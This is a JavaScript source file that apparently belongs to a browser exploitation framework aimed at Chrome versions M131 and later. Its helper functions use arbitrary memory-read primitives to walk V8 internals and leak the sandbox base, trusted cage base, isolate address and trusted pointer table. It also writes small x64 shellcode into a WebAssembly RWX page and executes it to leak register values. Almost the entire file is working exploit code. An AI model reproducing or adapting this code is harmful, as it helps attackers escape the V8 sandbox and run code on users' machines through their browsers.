// RWX helper
// Traverse isolate to find trusted pointer table
// Retrieve isolate: from chrome.dll base adress or from a RWX callable memory page
{
    var CHROME_DLL_ADDR, SANDBOX_BASE;
    var WASM_RWX_ADDR, WASM_RWX_CALLER
    var ISOLATE_ADDR, TRUSTED_CAGE_BASE, TRUSTED_PTR_TABLE;
    var _RWX_HELPERS;
    if (typeof _RWX_HELPERS === "undefined") {
        _RWX_HELPERS = {};
    }


    // Traverse the Chrome DLL to retrieve isolate
    // Working only on >= M131
    // Require "default_isolate_group" symbol RVA extracted from PDB:
    //   - use "global_isolate_group_" for M131-M132
    //   - use "default_isolate_group" or "v8::internal::IsolateGroup::default_isolate_group_" for >= M133
    // CHROME_DLL_ADDR -> SANDBOX_BASE, TRUSTED_CAGE_BASE, ISOLATE_ADDR
    _RWX_HELPERS.chromeToIsolate = () => {
        log("[i] Searching SANDBOX_BASE, TRUSTED_CAGE_BASE, ISOLATE_ADDR in Chrome DLL", 1);
        if (typeof SANDBOX_BASE !== "undefined" && typeof TRUSTED_CAGE_BASE !== "undefined" && typeof ISOLATE_ADDR !== "undefined") return;
        assert(typeof CHROME_DLL_ADDR !== "undefined", "[-] CHROME_DLL_ADDR is not set");


        // Get "default_isolate_group" symbol
        // Require reliable fingerprinting before
        let isolate_group_symbol = getSymbol("default_isolate_group");
        assert(typeof isolate_group_symbol !== "undefined", "[-] Can't traverse Chrome DLL to isolate: 'default_isolate_group' symbol not found for target browser version", 0);
        let isolate_group = CHROME_DLL_ADDR + isolate_group_symbol;


        // Retrieve real isolate_group when using v8::internal::IsolateGroup::default_isolate_group_ symbol
        if (getBigUint(isolate_group + 0x20n) === 0x0n) {
            isolate_group = getBigUint(isolate_group);
        }


        // Extract TRUSTED_CAGE_BASE & SANDBOX_BASE from global_isolate_group
        if (typeof TRUSTED_CAGE_BASE === "undefined") {
            let trusted_pointer_compression_cage = getBigUint(isolate_group + 0x10n);
            TRUSTED_CAGE_BASE = getBigUint(trusted_pointer_compression_cage + 0x8n);
            log("[+] Leaked TRUSTED_CAGE_BASE=0x" + hex(TRUSTED_CAGE_BASE), 2);
            assert((TRUSTED_CAGE_BASE > 0x0n) && ((TRUSTED_CAGE_BASE & 0xffffffffn) === 0x0n), "[-] Invalid TRUSTED_CAGE_BASE pointer");
        }

        if (typeof SANDBOX_BASE === "undefined") {
            let pointer_compression_cage = getBigUint(isolate_group + 0x18n);
            SANDBOX_BASE = getBigUint(pointer_compression_cage + 0x8n);
            log("[+] Leaked SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
            assert((SANDBOX_BASE > 0x0n) && ((SANDBOX_BASE & 0xffffffffn) === 0x0n), "[-] Invalid SANDBOX_BASE pointer");
        }


        // Find process_wide=_true after the external_ref_table_
        // Starting M131, shared_read_only_heap_ is right after
        // Then, traverse the shared heap to the isolate
        if (typeof ISOLATE_ADDR === "undefined") {
            assert(FINGERPRINT.browser.chromium_version.major >= 131, "[-] Chromium version should be >= 131", 0);
            let i = 0x3000n;
            while (i < 0x4000n && getBigUint(isolate_group + i) !== 0x1n) {
                i += 8n;
            }
            assert(getBigUint(isolate_group + i) === 0x1n, "[-] Failed to find the shared read only heap in the isolate group");
            let shared_read_only_heap = getBigUint(isolate_group + i + 0x18n);

            let read_only_space = getBigUint(shared_read_only_heap + 0x8n);
            let heap = getBigUint(read_only_space + 0x8n);
            ISOLATE_ADDR = getBigUint(heap + 0x18n);
            log("[+] Traversed Chrome DLL to isolate: ISOLATE_ADDR=0x" + hex(ISOLATE_ADDR), 2);
            assert(ISOLATE_ADDR > 0n && !(ISOLATE_ADDR % 0x1000n), "[-] Invalid ISOLATE_ADDR pointer");
        }
    }


    // Use a WASM RWX memory page to find isolate & trusted cage base (x64 only)
    // WASM_RWX_ADDR, WASM_RWX_CALLER -> ISOLATE_ADDR, TRUSTED_CAGE_BASE
    _RWX_HELPERS.wasmRWXToCages = () => {
        log("[i] Searching ISOLATE_ADDR & TRUSTED_CAGE_BASE using a WASM RWX memory page", 1);
        if (typeof ISOLATE_ADDR !== "undefined" && typeof TRUSTED_CAGE_BASE !== "undefined") return;
        assert(typeof WASM_RWX_ADDR !== "undefined", "[-] WASM_RWX_ADDR is not set");
        assert(typeof WASM_RWX_CALLER !== "undefined", "[-] WASM_RWX_CALLER is not set");
        assert((FINGERPRINT.platform.arch ?? "x64") === "x64", "[-] x64 architecture is required", 0);


        // Leak ISOLATE_ADDR
        if (typeof ISOLATE_ADDR === "undefined") {
            let shellcode = [0x4C, 0x89, 0xE8, 0xC3];    // mov rax, r13; ret
            writeShellcode(shellcode, WASM_RWX_ADDR);
            ISOLATE_ADDR = WASM_RWX_CALLER() & ~0xfffn;
            log("[+] Leaked ISOLATE_ADDR=0x" + hex(ISOLATE_ADDR), 2);
            assert(ISOLATE_ADDR > 0n && !(ISOLATE_ADDR % 0x1000n), "[-] Invalid ISOLATE_ADDR pointer");
        }


        // Leak TRUSTED_CAGE_BASE
        if (typeof TRUSTED_CAGE_BASE === "undefined") {
            let shellcode = [0x4C, 0x89, 0xE0, 0xC3];    // mov rax, r12; ret
            writeShellcode(shellcode, WASM_RWX_ADDR);
            TRUSTED_CAGE_BASE = WASM_RWX_CALLER() & ~0xffffffffn;
            log("[+] Leaked TRUSTED_CAGE_BASE=0x" + hex(TRUSTED_CAGE_BASE), 2);
            assert(TRUSTED_CAGE_BASE > 0x0n, "[-] Invalid TRUSTED_CAGE_BASE pointer");
        }
    }


    // Traverse the isolate to retrieve TRUSTED_PTR_TABLE (require TRUSTED_CAGE_BASE)
    // ISOLATE_ADDR, TRUSTED_CAGE_BASE -> TRUSTED_PTR_TABLE
    _RWX_HELPERS.isolateToPtrTable = () => {
        log("[i] Searching TRUSTED_PTR_TABLE in the isolate", 1);
        if (typeof TRUSTED_PTR_TABLE !== "undefined") return;
        assert(typeof ISOLATE_ADDR !== "undefined", "[-] ISOLATE_ADDR is not set");
        assert(typeof TRUSTED_CAGE_BASE !== "undefined" || typeof TRUSTED_CAGE_LEAK !== "undefined", "[-] TRUSTED_CAGE_BASE / TRUSTED_CAGE_LEAK are not set");

        if (typeof TRUSTED_CAGE_BASE === "undefined" && typeof TRUSTED_CAGE_LEAK !== "undefined"){
            TRUSTED_CAGE_BASE = TRUSTED_CAGE_LEAK & ~0xffffffffn;
            log("[+] Using TRUSTED_CAGE_BASE=0x" + hex(TRUSTED_CAGE_BASE), 2);
            assert(TRUSTED_CAGE_BASE > 0x0n, "[-] Invalid TRUSTED_CAGE_BASE pointer");
        }

        let i = 0n;
        while (i < 0x500n && arbRead(ISOLATE_ADDR + i) !== TRUSTED_CAGE_BASE) {
            i += 8n;
        }
        assert(i < 0x500n, "[-] Failed to retrieve TRUSTED_PTR_TABLE from ISOLATE_ADDR")

        TRUSTED_PTR_TABLE = arbRead(ISOLATE_ADDR + i + 0x8n);
        log("[+] Retrieved TRUSTED_PTR_TABLE=0x" + hex(TRUSTED_PTR_TABLE), 2);
        assert(TRUSTED_PTR_TABLE > 0n && !(TRUSTED_PTR_TABLE % 0x1000n), "[-] Invalid TRUSTED_PTR_TABLE pointer");
    };
}
